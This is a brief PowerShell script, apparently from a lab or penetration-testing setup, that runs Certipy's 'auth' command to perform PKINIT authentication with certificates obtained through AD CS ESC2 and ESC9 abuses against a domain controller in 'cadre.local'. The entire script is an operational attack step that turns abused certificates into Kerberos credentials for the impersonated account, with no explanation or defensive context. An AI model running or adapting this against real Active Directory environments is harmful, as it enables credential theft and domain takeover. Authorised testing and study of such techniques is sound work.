$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
Get-Process certipy -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

Write-Output "===== ESC2 auth (PKINIT on esc2 pfx) ====="
$p2 = Get-ChildItem C:\Tools\cadre-attack\*esc2*.pfx -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
Write-Output "pfx=$p2"
if ($p2) {
  & $certpy auth -pfx $p2 -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 16
  Write-Output "esc2_auth_rc=$LASTEXITCODE"
}

Get-Process certipy -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Write-Output "===== ESC9 auth (PKINIT on esc9 pfx) ====="
$p9 = Get-ChildItem C:\Tools\cadre-attack\*esc9*.pfx -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
Write-Output "pfx=$p9"
if ($p9) {
  & $certpy auth -pfx $p9 -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 16
  Write-Output "esc9_auth_rc=$LASTEXITCODE"
}
Write-Output "===== DONE ====="
